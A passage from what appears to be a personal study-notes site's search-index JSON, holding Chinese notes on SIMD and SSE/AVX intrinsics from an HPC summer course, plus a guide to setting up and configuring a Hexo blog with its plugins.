\u5927\u4e00\u6691\u5047\u5c0f\u5b66\u671f\u9009\u4e86\u8d85\u7b97\u961f\u7684\u8bfe\uff0c\u611f\u53d7\u611f\u53d7\u3001\u73a9\u4e00\u73a9\uff0c\u4e0d\u6e05\u695a\u4e4b\u540e\u4f1a\u4e0d\u4f1a\u7ee7\u7eed\u641e","title":"\u9ad8\u6027\u80fd\u8ba1\u7b97"},{"location":"hpc/#table-of-contents","text":"HPC 101 \u8d85\u7b97\u5c0f\u5b66\u671f \u5411\u91cf\u5316\u8ba1\u7b97","title":"Table of Contents"},{"location":"hpc/hpc101/vectorized/","text":"\u5411\u91cf\u5316\u8ba1\u7b97 \u00b6 Abstract \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e8c\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe PPT NumPy documentation NumPy Illustrated: The Visual Guide to NumPy Intel Intrinsics Guide SIMD \u7b80\u4ecb - \u77e5\u4e4e \u4ece Eigen \u5411\u91cf\u5316\u8c08\u5185\u5b58\u5bf9\u9f50 - \u77e5\u4e4e NumPy \u57fa\u7840 \u00b6 \u8be6\u89c1 Computer Science > \u7f16\u7a0b\u8bed\u8a00 > Python > NumPy SIMD \u00b6 \u5355\u6307\u4ee4\u591a\u6570\u636e\u6d41\uff08Single Instruction Multiple Data\uff09\uff0c\u5728\u786c\u4ef6\u5c42\u9762\u4e0a\u63d0\u4f9b\u4e86\u901a\u8fc7\u4e00\u6761\u6307\u4ee4\u8fd0\u884c\u591a\u4e2a\u8fd0\u7b97\u7684\u65b9\u6cd5 \u5728 x86 \u67b6\u6784\u4e0b\uff0cSIMD \u4e00\u534a\u548c SSE \u548c AVX \u7b49\u6307\u4ee4\u96c6\u8054\u7cfb\u5728\u4e00\u8d77\uff0cSSE \u548c AVX \u6307\u4ee4\u96c6\u4e2d\u63d0\u4f9b\u4e86\u5927\u91cf\u53ef\u4ee5\u5355\u6307\u4ee4\u64cd\u4f5c\u591a\u4e2a\u6570\u636e\u5355\u5143\u7684\u6307\u4ee4 SIMD \u76f4\u89c9\u4e0a\u53ef\u4ee5\u6781\u5927\u5730\u63d0\u5347\u6548\u7387\uff0c\u4f46\u5b9e\u9645\u60c5\u51b5\u6bd4\u8f83\u590d\u6742\uff0c\u6bd4\u5982\u5185\u5b58\u5e26\u5bbd\u4f7f\u7528\u3001\u89e3\u7801\u6d88\u8017\u7b49\uff0c\u9700\u8981\u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\uff0c\u5e76\u4e0d\u4ee3\u8868\u53ef\u4ee5\u540c\u65f6\u64cd\u4f5c\u4e24\u4e2a\u6570\u636e\uff0c\u52a0\u901f\u6bd4\u5c31\u662f 2 SIMD \u57fa\u7840 \u00b6 \u53d1\u5c55\u7b80\u53f2 \u00b6 1996 \u5e74 Intel \u63a8\u51fa\u4e86 x86 \u7684 MMX\uff08MultiMedia eXtension\uff09\u6307\u4ee4\u96c6\u6269\u5c55\uff0cMMX \u5b9a\u4e49\u4e86 8 \u4e2a MM \u5bc4\u5b58\u5668\uff0c\u79f0\u4e3a MM0 \u5230 MM7\uff0c\u4ee5\u53ca\u5bf9\u8fd9\u4e9b\u5bc4\u5b58\u5668\u8fdb\u884c\u64cd\u4f5c\u7684\u6307\u4ee4\u3002\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e3a 64 \u4f4d\u5bbd\uff0c\u53ef\u7528\u4e8e\u4ee5\u201c\u538b\u7f29\u201d\u683c\u5f0f\u4fdd\u5b58 64 \u4f4d\u6574\u6570\u6216\u591a\u4e2a\u8f83\u5c0f\u6574\u6570\uff0c\u7136\u540e\u53ef\u4ee5\u5c06\u5355\u4e2a\u6307\u4ee4\u4e00\u6b21\u5e94\u7528\u4e8e\u4e24\u4e2a 32 \u4f4d\u6574\u6570\uff0c\u56db\u4e2a 16 \u4f4d\u6574\u6570\u6216\u516b\u4e2a 8 \u4f4d\u6574\u6570 Intel \u5728 1999 \u5e74\u53c8\u63a8\u51fa\u4e86\u5168\u9762\u8986\u76d6 MMX \u7684 SSE\uff08Streaming SIMD Extensions\uff0c\u6d41\u5f0f SIMD \u6269\u5c55\uff09\u6307\u4ee4\u96c6\uff0cSSE \u6dfb\u52a0\u4e86 8 \u4e2a\u65b0\u7684 128 \u4f4d\u5bc4\u5b58\u5668\uff0cXMM0 \u5230XMM7\uff0c\u800c\u540e\u6765\u7684 x86_64 \u6269\u5c55\u53c8\u5728\u539f\u6765\u7684\u57fa\u7840\u4e0a\u6dfb\u52a0\u4e86 8 \u4e2a\u5bc4\u5b58\u5668\uff0cXMM8 \u5230 XMM15\u3002SSE \u652f\u6301\u5355\u4e2a\u5bc4\u5b58\u5668\u5b58\u50a8 4 \u4e2a 32 \u4f4d\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c\u4e4b\u540e\u7684 SSE2 \u5219\u652f\u6301\u5355\u4e2a\u5bc4\u5b58\u5668\u5b58\u50a8 2 \u4e2a 64 \u4f4d\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c2 \u4e2a 64 \u4f4d\u6574\u6570\u6216 4 \u4e2a 32 \u4f4d\u6574\u6570\u6216 8 \u4e2a 16 \u4f4d\u77ed\u6574\u5f62\u3002SSE2 \u4e4b\u540e\u8fd8\u6709 SSE3\uff0cSSE4 \u4ee5\u53ca AVX\uff0cAVX2 \u7b49\u6269\u5c55\u6307\u4ee4\u96c6 AVX \u5f15\u5165\u4e86 16 \u4e2a 256 \u4f4d\u5bc4\u5b58\u5668\uff0cYMM0 \u81f3 YMM15\uff0cAVX \u7684 256 \u4f4d\u5bc4\u5b58\u5668\u548c SSE \u7684 128 \u4f4d\u5bc4\u5b58\u5668\u5b58\u5728\u7740\u76f8\u4e92\u91cd\u53e0\u7684\u5173\u7cfb\uff08XMM \u5bc4\u5b58\u5668\u4e3a YMM \u5bc4\u5b58\u5668\u7684\u4f4e 128\u4f4d\uff0c\u7c7b\u4f3c 8086 \u4e2d\u7684 ax \u4e0e al\uff09\u3002AVX256 \u652f\u6301\u5728\u4e00\u4e2a YMM \u5bc4\u5b58\u5668\u4e2d\u5b58\u50a8 8 \u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6216 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 AVX512 \u589e\u52a0\u4e86 512 \u4f4d\u5bc4\u5b58\u5668\u548c\u76f8\u5173\u64cd\u4f5c\uff0c\u4f46\u662f\u6548\u7387\u4e0d\u9ad8\u3001\u4f1a\u4f7f\u5904\u7406\u5668\u53d1\u70ed\u4e25\u91cd\u3001\u4ee5\u53ca\u5f88\u53ef\u80fd\u4f1a\u51fa\u73b0\u8d1f\u4f18\u5316\uff0c\u6240\u4ee5\u4e00\u822c\u4e0d\u4f7f\u7528 Linux \u53ef\u4ee5\u901a\u8fc7 cat /proc/cpuinfo \u6765\u67e5\u770b CPU \u652f\u6301\u7684\u6307\u4ee4\u96c6\uff0cmacOS \u53ef\u4ee5\u901a\u8fc7 sysctl -a | grep machdep.cpu.features \u6765\u67e5\u770b SIMD \u4f7f\u7528\u65b9\u6cd5 \u00b6 \u6709\u5f88\u591a\u79cd\u4f7f\u7528 SIMD \u7684\u65b9\u6cd5\uff0c\u4ece\u9876\u5c42\u5230\u5e95\u5c42\u4f9d\u6b21\u662f\uff1a \u4f7f\u7528 Intel \u5f00\u53d1\u7684\u8de8\u5e73\u53f0\u51fd\u6570\u5e93\uff08IPP\uff0cIntel Integrated Performance Primitives\uff09\uff0c\u91cc\u9762\u7684\u6307\u4ee4\u662f\u4f7f\u7528 SIMD \u4f18\u5316\u8fc7\u7684 \u81ea\u52a8\u5411\u91cf\u5316\uff08Auto-vectorization\uff09\uff0c\u7531\u7f16\u8bd1\u5668\u5c06\u6807\u91cf\u4f18\u5316\u4e3a\u5411\u91cf\u64cd\u4f5c \u4f7f\u7528\u7f16\u8bd1\u5668\u6307\u793a\u7b26\uff08Compiler directive\uff09\uff0c\u5373\u4f7f\u7528 #progma simd \u5f3a\u5236\u5faa\u73af\u5411\u91cf\u5316 \u4f7f\u7528\u5185\u7f6e\u51fd\u6570\uff08Intrinsics\uff09\uff0cIntel \u63d0\u4f9b\u7684\u4e00\u4e9b\u6307\u4ee4\u7684\u5305\u88c5 \u76f4\u63a5\u7f16\u5199\u6c47\u7f16\u4ee3\u7801 \u624b\u5199 SIMD \u4e00\u822c\u4f7f\u7528 Intrinsics \u6765\u5b9e\u73b0 \u7b80\u5355\u60c5\u51b5\u4e0b\u6ca1\u6709\u5fc5\u8981\u624b\u5199\uff0c\u901a\u8fc7 -O3 -mavx2 \u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u4f18\u5316\u5730\u5f88\u597d\u3002\u4f46\u5982\u679c\u4ee3\u7801\u7ed3\u6784\u590d\u6742\uff0c\u5faa\u73af\u96be\u4ee5\u754c\u5b9a\u8fb9\u754c\uff0c\u751a\u81f3\u8fd8\u6709\u5206\u652f\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5c31\u9700\u8981\u624b\u5199 SIMD SSE/AVX Intrinsics \u00b6 \u5934\u6587\u4ef6 \u00b6 \u63d0\u4f9b\u8fd9\u4e9b intrinsics \u7684\u5934\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 ? mmintrin.h \u6765\u5bfc\u5165\uff0c\u4e0d\u540c\u6307\u4ee4\u96c6\u7684\u5934\u6587\u4ef6\u4e0d\u540c\uff1a xmmintrin.h \uff1aSSE\uff0c\u652f\u6301\u540c\u65f6\u5bf9 4 \u4e2a 32 \u4f4d\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684\u64cd\u4f5c emmintrin.h \uff1aSSE 2\uff0c\u652f\u6301\u540c\u65f6\u5bf9 2 \u4e2a 64 \u4f4d\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684\u64cd\u4f5c pmmintrin.h \uff1aSSE 3\uff0c\u652f\u6301\u5bf9 SIMD \u5bc4\u5b58\u5668\u7684\u6c34\u5e73\u64cd\u4f5c\uff08horizontal operation\uff09\uff0c\u5982 hadd, hsub \u7b49... tmmintrin.h \uff1aSSSE 3\uff0c\u589e\u52a0\u4e86\u989d\u5916\u7684 instructions smmintrin.h \uff1aSSE 4.1\uff0c\u652f\u6301\u70b9\u4e58\u4ee5\u53ca\u66f4\u591a\u7684\u6574\u5f62\u64cd\u4f5c nmmintrin.h \uff1aSSE 4.2\uff0c\u589e\u52a0\u4e86\u989d\u5916\u7684 instructions immintrin.h \uff1aAVX\uff0c\u652f\u6301\u540c\u65f6\u64cd\u4f5c 8 \u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6216 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 \u800c\u4e14\u540e\u9762\u7684\u5934\u6587\u4ef6\u5305\u542b\u524d\u9762\u6240\u6709\u7684\u5185\u5bb9 \u6570\u636e\u7c7b\u578b \u00b6 \u989d\u5916\u6570\u636e\u7c7b\u578b\u4ee5 __m xxx [ T ] \u7684\u5f62\u5f0f\u547d\u540d\uff1a xxx \uff1a\u5b58\u50a8\u6570\u636e\u7684\u603b\u4f4d\u6570\uff0c\u6bd4\u5982 128\u3001256 [ T ]\uff1a\u5b58\u50a8\u7684\u6bcf\u4e2a\u5355\u5143\u7684\u7c7b\u578b\uff0c\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7701\u7565\uff0c\u6574\u578b\u4e3a i\uff0c\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u4e3a d \u4f8b\u5982\u5b58\u50a8\u4e86 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684 256 \u4f4d\u6570\u636e\u7684\u7c7b\u578b\u4e3a __m256d \u51fd\u6570 \u00b6 Intrinsics \u63d0\u4f9b\u7684\u51fd\u6570\u4e00\u822c\u4ee5 _mm[ xxx ]_ name _ PT \u7684\u5f62\u5f0f\u547d\u540d\uff1a [ xxx ]\uff1a\u64cd\u4f5c\u6570\u7684\u4f4d\u6570\uff0c\u82e5\u4e3a 128 \u5219\u7701\u7565 name \uff1a\u51fd\u6570\u540d\u79f0\uff0c\u548c\u7528\u5904\u76f8\u5173 P \uff1a\u5411\u91cf\u64cd\u4f5c\u8fd8\u662f\u6807\u91cf\u64cd\u4f5c p \u8868\u793a\u5411\u91cf\u64cd\u4f5c\uff0c\u4f8b\u5982 _mm_add_ps \u5bf9\u56db\u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u540c\u65f6\u8fdb\u884c\u52a0\u6cd5 s \u8868\u793a\u6807\u91cf\u64cd\u4f5c\uff0c\u4f8b\u5982 _mm_add_ss \u53ea\u5bf9\u6700\u4f4e\u4f4d\u7684\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8fdb\u884c\u52a0\u6cd5 \u5bf9\u4e8e\u6574\u578b\u5411\u91cf\u64cd\u4f5c\uff0cMMX \u6307\u4ee4\u96c6\uff08\u64cd\u4f5c\u6570\u4e3a 64 \u4f4d\uff09\u4f7f\u7528 p\u3001\u5176\u5b83\u60c5\u51b5\u4e0b\u4e3a ep\uff0c\u4f8b\uff1a __m64 _mm_add_pi8 ( __m64 a , __m64 b ) __m128i _mm_add_epi8 ( __m128i a , __m128i b ) T \uff1a\u64cd\u4f5c\u6570\u7684\u6570\u636e\u7c7b\u578b \u6d6e\u70b9\u578b\uff1a\u5355\u7cbe\u5ea6\u4e3a s\u3001\u53cc\u7cbe\u5ea6\u4e3a d \u6574\u578b\uff1a\u6709\u7b26\u53f7 i size \u3001\u65e0\u7b26\u53f7 u size \uff0c size \u8868\u793a\u6bcf\u4e2a\u5355\u5143\u4e2d\u6574\u578b\u7684\u5bbd\u5ea6 \u4e3b\u8981\u5206\u7c7b\uff1a \u5b58/\u53d6\uff08store/load/set\uff09 load \u7c7b\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u6307\u9488\uff0c\u8bfb\u53d6\u5bf9\u5e94\u4f4d\u7f6e\u5f00\u59cb\u7684\u5185\u5bb9\uff0c\u8fd4\u56de\u5bf9\u5e94\u6570\u636e\u7c7b\u578b\u7684\u53d8\u91cf load \u8981\u6c42\u5185\u5b58\u5bf9\u9f50\uff08\u4e0b\u9762\u8bf4\uff09 loadu \u4e0d\u8981\u6c42\u5185\u5b58\u5bf9\u9f50 loadr \u53cd\u5411\u8bfb\u53d6 store \u7c7b\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u6307\u9488\u8868\u793a\u5f00\u59cb\u5b58\u653e\u7684\u9996\u5730\u5740\uff0c\u548c\u4e00\u4e2a\u5f85\u5b58\u50a8\u7684\u53d8\u91cf\uff0c\u65e0\u8fd4\u56de\u503c store \u8981\u6c42\u5185\u5b58\u5bf9\u9f50 storeu \u4e0d\u8981\u6c42\u5185\u5b58\u5bf9\u9f50 storer \u53cd\u5411\u5b58\u50a8 set \u7c7b\u51fd\u6570\u76f4\u63a5\u63a5\u6536\u591a\u4e2a\u5f85\u5b58\u50a8\u7684\u666e\u901a\u7c7b\u578b\u6570\u636e\uff0c\u8fd4\u56de\u5bf9\u5e94\u5927\u7c7b\u578b\u7684\u53d8\u91cf \u7b97\u672f\u8fd0\u7b97\uff1aadd sub mul div sqrt \u52a0\u51cf\u4e58\u9664\u5f00\u6839\u53f7\uff0crcp \u6c42\u5012\u6570\u3001dp \u8ba1\u7b97\u70b9\u4e58 \u2026\u2026 \u6bd4\u8f83\u8fd0\u7b97\uff1amax min cmpeq cmpge cmpgt cmple \u2026\u2026 \u903b\u8f91\u8fd0\u7b97\uff1aand or xor\u3001andnot \u5148\u5bf9\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u6c42 not \u7136\u540e\u9010\u5206\u91cf and \u2026\u2026 Swizzle \u8fd0\u7b97\uff1ashuffle blend movelh \u5b8c\u6574\u7684\u6307\u4ee4\u96c6\u5bf9\u5e94 Intrinsics \u51fd\u6570\u5217\u8868\u4ee5\u53ca\u7528\u6cd5\u7528\u9014\u89c1\uff1a Intel Intrinsics Guide \u5185\u5b58\u5bf9\u9f50 \u00b6 \u4e00\u822c\u7684\u5b58\u53d6\u64cd\u4f5c\u8981\u6c42\u5b58\u53d6\u7684\u5185\u5b58\u662f\u5bf9\u9f50\u7684\uff0c\u6bd4\u5982 _mm_load_ps \u8981\u6c42 16 \u4f4d\u5bf9\u9f50\uff08\u4e5f\u5c31\u662f\u8bf4\u4f20\u5165\u7684\u5730\u5740\u53ef\u4ee5\u88ab 16 \u6574\u9664\uff0c\u5373\u5730\u5740\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u4e3a 0\uff09\u3001_mm256_load_ps \u8981\u6c42 32 \u4f4d\u5bf9\u9f50\uff08\u5373\u5730\u5740\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u4e3a 0\uff0c\u5012\u6570\u7b2c\u4e8c\u4f4d\u4e3a\u5076\uff09 \u5728\u6808\u4e0a\u5f3a\u5236\u8fdb\u884c 32 \u4f4d\u5185\u5b58\u5bf9\u9f50\uff1a gcc \u8bed\u6cd5\uff1a__attribute__ ((aligned (32))) double a[4] MSVC \u8bed\u6cd5\uff1a__declspec(align(32)) double a[4] \u8fd9\u6837\u5b9a\u4e49\u7684\u5305\u542b\u56db\u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6570\u7ec4 a \u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 _mm256_load_pd \u6765\u8bfb\u53d6 \u66f4\u591a\u5173\u4e8e\u5185\u5b58\u5bf9\u9f50\uff0c\u89c1 \u4ece Eigen \u5411\u91cf\u5316\u8c08\u5185\u5b58\u5bf9\u9f50 - \u77e5\u4e4e","title":"\u5411\u91cf\u5316\u8ba1\u7b97"},{"location":"hpc/hpc101/vectorized/#_1","text":"Abstract \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e8c\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe PPT NumPy documentation NumPy Illustrated: The Visual Guide to NumPy Intel Intrinsics Guide SIMD \u7b80\u4ecb - \u77e5\u4e4e \u4ece Eigen \u5411\u91cf\u5316\u8c08\u5185\u5b58\u5bf9\u9f50 - \u77e5\u4e4e","title":"\u5411\u91cf\u5316\u8ba1\u7b97"},{"location":"hpc/hpc101/vectorized/#numpy","text":"\u8be6\u89c1 Computer Science > \u7f16\u7a0b\u8bed\u8a00 > Python > NumPy","title":"NumPy \u57fa\u7840"},{"location":"hpc/hpc101/vectorized/#simd","text":"\u5355\u6307\u4ee4\u591a\u6570\u636e\u6d41\uff08Single Instruction Multiple Data\uff09\uff0c\u5728\u786c\u4ef6\u5c42\u9762\u4e0a\u63d0\u4f9b\u4e86\u901a\u8fc7\u4e00\u6761\u6307\u4ee4\u8fd0\u884c\u591a\u4e2a\u8fd0\u7b97\u7684\u65b9\u6cd5 \u5728 x86 \u67b6\u6784\u4e0b\uff0cSIMD \u4e00\u534a\u548c SSE \u548c AVX \u7b49\u6307\u4ee4\u96c6\u8054\u7cfb\u5728\u4e00\u8d77\uff0cSSE \u548c AVX \u6307\u4ee4\u96c6\u4e2d\u63d0\u4f9b\u4e86\u5927\u91cf\u53ef\u4ee5\u5355\u6307\u4ee4\u64cd\u4f5c\u591a\u4e2a\u6570\u636e\u5355\u5143\u7684\u6307\u4ee4 SIMD \u76f4\u89c9\u4e0a\u53ef\u4ee5\u6781\u5927\u5730\u63d0\u5347\u6548\u7387\uff0c\u4f46\u5b9e\u9645\u60c5\u51b5\u6bd4\u8f83\u590d\u6742\uff0c\u6bd4\u5982\u5185\u5b58\u5e26\u5bbd\u4f7f\u7528\u3001\u89e3\u7801\u6d88\u8017\u7b49\uff0c\u9700\u8981\u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\uff0c\u5e76\u4e0d\u4ee3\u8868\u53ef\u4ee5\u540c\u65f6\u64cd\u4f5c\u4e24\u4e2a\u6570\u636e\uff0c\u52a0\u901f\u6bd4\u5c31\u662f 2","title":"SIMD"},{"location":"hpc/hpc101/vectorized/#simd_1","text":"","title":"SIMD \u57fa\u7840"},{"location":"hpc/hpc101/vectorized/#sseavx-intrinsics","text":"","title":"SSE/AVX Intrinsics"},{"location":"misc/","text":"\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f \u00b6 Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u7b14\u8bb0\uff0c\u5927\u90e8\u5206\u662f\u4e00\u4e9b\u5de5\u5177\u7684\u7528\u6cd5 Table of Contents \u00b6 ZJU \u8bfe\u7a0b\u624b\u5199\u7b14\u8bb0\u6c47\u603b mkdocs hexo sphinx","title":"\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f"},{"location":"misc/#_1","text":"Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u7b14\u8bb0\uff0c\u5927\u90e8\u5206\u662f\u4e00\u4e9b\u5de5\u5177\u7684\u7528\u6cd5","title":"\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f"},{"location":"misc/#table-of-contents","text":"ZJU \u8bfe\u7a0b\u624b\u5199\u7b14\u8bb0\u6c47\u603b mkdocs hexo sphinx","title":"Table of Contents"},{"location":"misc/hexo/","text":"hexo \u4f7f\u7528\u8bb0\u5f55 \u00b6 Abstract \u5f53\u65f6\u5728\u7528 mkdocs \u642d\u5efa\u4e86\u535a\u5ba2\u4e4b\u540e\u611f\u89c9\u4e0d\u50cf\u4e2a\u535a\u5ba2\u7684\u6837\u5b50\uff0c\u6240\u4ee5\u6362\u4e86 hexo\uff0c\u7528\u6765\u751f\u6210\u535a\u5ba2\u7f51\u7ad9\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684\u3002 \u5b89\u88c5 \u00b6 hexo \u57fa\u4e8e node.js\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 npm install -g hexo-cli \u6765\u5b89\u88c5 \u4f7f\u7528 \u00b6 \u521b\u5efa blog \u76ee\u5f55\u653e\u7f6e\u535a\u5ba2\uff1a $ hexo init blog # \u4e5f\u53ef\u4ee5\u624b\u52a8\u521b\u5efa\u76ee\u5f55\u540e\u8fdb\u5165 $ mkdir blog & cd blog & hexo init \u5b89\u88c5\u9700\u8981\u7684\u5305\uff1a $ npm install \u542f\u52a8\u5185\u7f6e\u9884\u89c8\u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3 4000\uff09\uff1a $ hexo s # hexo serve \u751f\u6210\u7f51\u7ad9\uff1a $ hexo g # hexo generate \u4e4b\u540e\u4f1a\u751f\u6210\u4e00\u4e2a public/ \u6587\u4ef6\u5939\uff0c\u4e3a\u7f51\u7ad9\u6e90\u7801 hexo init \u751f\u6210\u7684\u76ee\u5f55\u7ed3\u6784\u4e3a\uff1a \u251c\u2500\u2500 _config.yml # \u914d\u7f6e\u6587\u4ef6 \u251c\u2500\u2500 package.json # \u5e94\u7528\u4fe1\u606f \u251c\u2500\u2500 scaffolds/ # \u6a21\u677f\u6587\u4ef6\u5939 \u251c\u2500\u2500 source/ # \u6e90\u6587\u4ef6\u5939 | \u2514\u2500\u2500 _posts/ # \u7a3f\u4ef6\u6587\u4ef6\u5939 \u2514\u2500\u2500 themes/ # \u4e3b\u9898\u6587\u4ef6\u5939 \u521b\u5efa\u4e00\u7bc7\u65b0\u7684\u6587\u7ae0\u4f7f\u7528 hexo new \u547d\u4ee4\uff0c\u9ed8\u8ba4\u4f1a\u521b\u5efa\u4e00\u7bc7 post\uff0c\u6bd4\u5982 hexo new \"test\" \u4f1a\u5728 source/_post/ \u91cc\u4f7f\u7528 scaffolds/post.md \u4e3a\u6a21\u677f\u521b\u5efa\u4e00\u4e2a test.md \u914d\u7f6e \u00b6 _config.yml \u8fd9\u4e2a\u6587\u4ef6\u662f hexo \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u5185\u5bb9\uff1a title \uff1a\u7f51\u7ad9\u6807\u9898 subtitle \uff1a\u526f\u6807\u9898 description \uff1a\u7f51\u7ad9\u63cf\u8ff0 keywords \uff1a\u7f51\u7ad9\u5173\u952e\u8bcd author \uff1a\u4f5c\u8005 language \uff1a\u8bed\u8a00 timezone \uff1a\u65f6\u533a \u4ee5\u4e0a\u8bbe\u7f6e\u4f1a\u51fa\u73b0\u5728 meta \u91cc url \uff1a\u7f51\u5740 root \uff1a\u7f51\u7ad9\u6839\u76ee\u5f55 permalink \uff1a\u6c38\u4e45\u94fe\u63a5\u683c\u5f0f\uff0c\u6bd4\u5982 :year/:month/:day/:title/ source_dir \uff1a\u6e90\u6587\u4ef6\u5939\uff0c\u9ed8\u8ba4 source public_dir \uff1a\u751f\u6210\u7684\u7f51\u7ad9\u6587\u4ef6\u5939 theme \uff1a\u4e3b\u9898 \u2026\u2026 \u6240\u6709\u914d\u7f6e\u8fd8\u662f\u770b\u5b98\u7f51\uff1a https://hexo.io/zh-cn/docs/configuration \u90e8\u7f72\u5230 GitHub pages \u00b6 \u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a deploy : - type : git repo : https://github.com/.../... branch : master \u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 hexo d \uff08 hexo deploy \uff09\u6765\u90e8\u7f72\u5230 GitHub pages \u4e0a\uff08\u6216\u8005 hexo d -g \u751f\u6210\u5e76\u90e8\u7f72\uff09 \u4e00\u4e9b\u63d2\u4ef6 \u00b6 \u5b89\u88c5\u63d2\u4ef6\u90fd\u53ef\u4ee5\u901a\u8fc7 npm install ... --save \u6765\u5b89\u88c5 hexo-abbrlink \u00b6 \u751f\u6210\u4e00\u4e2a\u77ed\u7684\u6c38\u4e45\u94fe\u63a5\uff0c\u5b89\u88c5\u540e\u53ea\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6539\uff1a permalink : p/:abbrlink.html abbrlink : alg : crc32 rep : hex \u5c31\u4f1a\u4e3a\u5229\u7528 crc32 \u4e3a\u6bcf\u7bc7\u6587\u7ae0\u8bbe\u7f6e\u4e00\u4e2a hex \u503c\u7684\u6c38\u4e45\u94fe\u63a5 hexo-blog-encrypt \u00b6 \u53ef\u4ee5\u4e3a\u6587\u7ae0\u52a0\u5bc6\uff0c\u53ea\u9700\u8981\u5728 md \u7684\u6587\u4ef6\u5934\u52a0\u4e0a\uff1a password : ... \u5c31\u53ef\u4ee5\u52a0\u5bc6\u8fd9\u7bc7\u6587\u7ae0\u3002\u66f4\u591a\u7528\u6cd5\u548c\u8bbe\u7f6e\u5728 GitHub \u4e0a\uff1a D0n9X1n/hexo-blog-encrypt hexo-generator-index/archive/category/tag \u00b6 \u57fa\u672c\u662f\u5fc5\u987b\u8981\u88c5\u7684\u4e86\uff0c\u7528\u6765\u751f\u6210\u4e3b\u9875/\u5f52\u6863/\u5206\u7c7b/\u6807\u7b7e\u6587\u4ef6\u5939 index_generator : path : '' per_page : 10 order_by : '-date' archive_generator : per_page : 30 tag_generator : per_page : 30 category_generator : per_page : 30 \u5206\u522b\u7528\u6765\u6307\u5b9a\u5404\u4e2a\u9875\u9762\u6bcf\u4e2a\u9875\u9762\u7684\u6587\u7ae0\u4e2a\u6570 hexo-generator-feed \u00b6 \u7528\u6765\u751f\u6210 RSS \u8ba2\u9605 xml \u6587\u4ef6 feed : enable : true type : atom path : atom.xml limit : 20 hexo-generator-index-pin-top \u00b6 \u7f6e\u9876\u67d0\u7bc7\u6587\u7ae0\uff0c\u53ea\u9700\u8981\u5728\u6587\u4ef6\u5934\u52a0\u4e0a top: true \u5373\u53ef \u4f46\u662f icarus \u4e3b\u9898\u597d\u50cf\u4e0d\u652f\u6301\u2026\u2026 hexo-generator-search/searchdb \u00b6 \u7528\u6765\u751f\u6210\u641c\u7d22\u76f8\u5173 search : path : search.xml field : all content : true limit : 9999 hexo-wordcount \u00b6 \u7528\u6765\u751f\u6210\u5b57\u6570\u7edf\u8ba1\u3002\u597d\u50cf\u4e0d\u9700\u8981\u914d\u7f6e\u4ec0\u4e48 \u4e3b\u9898 \u00b6 \u73b0\u5728\u7684\u535a\u5ba2\u7528\u4e86\u4e00\u4e2a\u633a\u7b80\u6d01\u7684\u4e3b\u9898\uff0c ppoffice/hexo-theme-icarus \u4f46\u662f\u8fd9\u4e2a\u4e3b\u9898\u7684\u5f0a\u7aef\u4e5f\u633a\u591a\uff0c\u6bd4\u5982\u6240\u6709\u9875\u9762\u90fd\u4f1a\u52a0\u8f7d\u4e00\u4e2a content.json\uff0c\u91cc\u9762\u5b58\u653e\u4e86\u6574\u4e2a\u7f51\u7ad9\u7684\u6240\u6709\u6587\u7ae0\u5305\u62ec\u5185\u5bb9\uff0c\u5bfc\u81f4\u52a0\u8f7d\u5f88\u6162\uff08\u8822\u7684\u5f88\uff09 \u6574\u4e2a\u4e3b\u9898\u57fa\u672c\u4e0a\u662f\u7528 jsx \u6765\u5199\u7684\uff0c\u6837\u5f0f\u662f\u7528 styl \u5199\u7684\uff0c\u6539\u7684\u8bdd\u8fd8\u6bd4\u8f83\u65b9\u4fbf 